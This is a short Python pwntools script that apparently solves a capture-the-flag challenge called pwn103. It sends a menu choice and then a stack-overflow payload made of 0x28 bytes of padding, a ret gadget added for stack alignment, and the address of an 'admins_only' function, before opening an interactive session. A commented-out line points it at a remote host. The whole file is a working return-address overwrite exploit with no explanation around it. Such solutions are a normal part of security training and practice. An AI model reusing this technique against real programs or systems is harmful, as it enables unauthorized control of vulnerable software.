from pwn import *

context.binary = e = ELF('./pwn103-1644300337872.pwn103')
p = process('./pwn103-1644300337872.pwn103')
# p = remote('10.49.157.175', 9003)

# payload = b"A" * 0x28 + p64(e.sym['admins_only'])
ret = p64(0x00401377)
# We need to add ret gadget to fix stack alignment because of MOVAPS
payload = b"A" * 0x28 + ret + p64(e.sym['admins_only'])

p.sendline(b"3")
p.sendline(payload)
p.interactive()